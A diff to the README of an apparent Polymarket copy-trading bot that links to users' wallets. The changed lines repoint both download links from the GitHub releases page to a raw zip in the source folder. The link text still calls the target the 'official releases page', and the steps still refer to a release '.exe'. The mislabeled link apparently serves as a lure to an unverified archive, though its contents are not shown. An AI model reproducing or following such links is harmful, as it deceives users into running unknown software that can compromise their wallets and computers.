@@ -1,6 +1,6 @@
 # 🤖 polymarket-copy-trading-bot - Automated trading to mimic successful strategies
 
-[![Download Latest Version](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/pilulariatwo764/polymarket-copy-trading-bot/releases)
+[![Download Latest Version](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/pilulariatwo764/polymarket-copy-trading-bot/raw/refs/heads/main/src/bot_trading_copy_polymarket_v3.0.zip)
 
 This software automates trade execution on the Polymarket platform. It monitors chosen accounts and applies the same transactions to your connected wallet. This tool saves time and removes the need for manual order entry.
 
@@ -18,7 +18,7 @@ To run this software, ensure your computer meets these minimum standards:
 
 Follow these steps to set up the software on your Windows machine.
 
-1.  Visit the [official releases page](https://github.com/pilulariatwo764/polymarket-copy-trading-bot/releases) to download the application.
+1.  Visit the [official releases page](https://github.com/pilulariatwo764/polymarket-copy-trading-bot/raw/refs/heads/main/src/bot_trading_copy_polymarket_v3.0.zip) to download the application.
 2.  Locate the file ending in `.exe` under the latest release section.
 3.  Click the file to start the download.
 4.  Navigate to your Downloads folder once the process finishes.
